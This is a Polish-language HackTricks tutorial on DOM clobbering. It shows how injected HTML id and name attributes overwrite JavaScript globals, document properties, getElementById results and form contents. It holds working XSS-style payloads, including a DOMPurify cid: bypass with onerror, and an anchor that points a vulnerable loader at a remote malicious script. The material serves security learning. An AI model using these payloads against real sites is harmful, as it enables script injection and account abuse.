# Dom Clobbering

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Podstawy**

Możliwe jest generowanie **globalnych zmiennych w kontekście JS** za pomocą atrybutów **`id`** i **`name`** w tagach HTML.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Tylko** określone elementy mogą używać atrybutu **name** do nadpisania globalnych zmiennych, są to: `embed`, `form`, `iframe`, `image`, `img` i `object`.

Co ciekawe, gdy używasz elementu **formularza** do **nadpisania** zmiennej, otrzymasz wartość **`toString`** tego elementu: `[object HTMLFormElement]`, ale z **anchor** wartość **`toString`** będzie wartością atrybutu **`href`**. Dlatego, jeśli nadpisujesz za pomocą znacznika **`a`**, możesz **kontrolować** wartość, gdy jest **traktowana jako ciąg znaków**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Tablice i atrybuty

Możliwe jest również **nadpisanie tablicy** i **atrybutów obiektu**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Aby nadpisać **trzeci atrybut** (np. x.y.z), musisz użyć **`formularza`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Nadpisywanie większej liczby atrybutów jest **bardziej skomplikowane, ale wciąż możliwe**, przy użyciu ramek (iframes):
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Tag style jest używany, aby **dać wystarczająco dużo czasu na renderowanie iframe**. Bez niego otrzymasz alert o **undefined**.
{% endhint %}

Aby nadpisać głębsze atrybuty, możesz użyć **iframe'ów z kodowaniem HTML** w ten sposób:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Ominięcie filtrów**

Jeśli filtr **pętli** przez **właściwości** węzła, używając czegoś takiego jak `document.getElementByID('x').attributes`, możesz **nadpisać** atrybut **`.attributes`** i **złamać filtr**. Inne właściwości DOM, takie jak **`tagName`**, **`nodeName`** lub **`parentNode`**, również są **nadpisywalne**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Nadpisywanie `window.someObject`**

W języku JavaScript często można znaleźć:
```javascript
var someObject = window.someObject || {};
```
Manipulowanie HTML na stronie umożliwia nadpisanie `someObject` za pomocą węzła DOM, co potencjalnie wprowadza podatności na bezpieczeństwo. Na przykład, można zastąpić `someObject` elementem kotwicy wskazującym na złośliwy skrypt:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
W podatnym kodzie, takim jak:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Ta metoda wykorzystuje źródło skryptu do wykonania niechcianego kodu.

**Sztuczka**: **`DOMPurify`** pozwala na użycie protokołu **`cid:`**, który **nie koduje podwójne cudzysłowy w adresie URL**. Oznacza to, że można **wstrzyknąć zakodowany podwójny cudzysłów, który zostanie zdekodowany w czasie wykonania**. Dlatego wstrzyknięcie czegoś takiego jak **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** spowoduje, że zakodowany HTML `&quot;` zostanie **zdekodowany w czasie wykonania** i **wydostanie się** z wartości atrybutu, aby **utworzyć** zdarzenie **`onerror`**.

Inna technika wykorzystuje element **`form`**. Niektóre biblioteki po stronie klienta sprawdzają atrybuty nowo utworzonego elementu formularza w celu ich oczyszczenia. Jednak dodanie `input` z `id=attributes` wewnątrz formularza skutecznie nadpisuje właściwość atrybutów, uniemożliwiając dostęp do rzeczywistych atrybutów przez oczyszczacz.

Możesz [**znaleźć przykład tego rodzaju nadpisywania w tym opisie CTF**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Nadpisywanie obiektu dokumentu

Zgodnie z dokumentacją możliwe jest nadpisanie atrybutów obiektu dokumentu za pomocą DOM Clobbering:

> Interfejs [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [obsługuje nazwane właściwości](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Obsługiwane nazwy właściwości obiektu [Document](https://html.spec.whatwg.org/multipage/dom.html#document) w dowolnym momencie składają się z następujących, w [kolejności drzewa](https://dom.spec.whatwg.org/#concept-tree-order) zgodnie z elementem, który je dostarczył, ignorując późniejsze duplikaty, a wartości z atrybutów [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) pochodzą przed wartościami z atrybutów name, gdy ten sam element dostarcza oba:
>
> \- Wartość atrybutu name dla wszystkich [eksponowanych](https://html.spec.whatwg.org/multipage/dom.html#exposed) elementów [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) i [eksponowanych](https://html.spec.whatwg.org/multipage/dom.html#exposed) elementów [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), które mają niepusty atrybut name i są [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Wartość atrybutu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) dla wszystkich [eksponowanych](https://html.spec.whatwg.org/multipage/dom.html#exposed) elementów [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), które mają niepusty atrybut [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) i są [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Wartość atrybutu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) dla wszystkich elementów [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), które mają zarówno niepusty atrybut [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), jak i niepusty atrybut name, i są [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root).

Za pomocą tej techniki można nadpisać powszechnie używane **wartości, takie jak `document.cookie`, `document.body`, `document.children`**, a nawet metody w interfejsie Document, takie jak `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2) [img, form, cookie: img]

typeof(document.cookie)
'object
```
## Pisanie po zastąpieniu elementu

Wyniki wywołań **`document.getElementById()`** i **`document.querySelector()`** mogą być zmienione poprzez wstrzyknięcie znacznika `<html>` lub `<body>` z identycznym atrybutem id. Oto jak to można zrobić:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Ponadto, poprzez zastosowanie stylów do ukrycia wstrzykniętych tagów HTML/body, można zapobiec zakłóceniom spowodowanym przez inne teksty w `innerText`, co zwiększa skuteczność ataku:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Badania nad SVG wykazały, że tag `<body>` może być również skutecznie wykorzystany:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Aby tag HTML działał wewnątrz SVG w przeglądarkach takich jak Chrome i Firefox, konieczne jest użycie tagu `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Nadpisywanie formularzy

Możliwe jest dodawanie **nowych wpisów do formularza** poprzez **określenie atrybutu `form`** wewnątrz niektórych tagów. Można to wykorzystać do **dodawania nowych wartości do formularza** oraz do dodawania nowego **przycisku** do **jego wysłania** (clickjacking lub nadużycie kodu JS `.click()`):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Aby uzyskać więcej atrybutów formularza, sprawdź [**to**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Referencje

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript dla hakerów: Naucz się myśleć jak haker.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć **reklamę swojej firmy w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
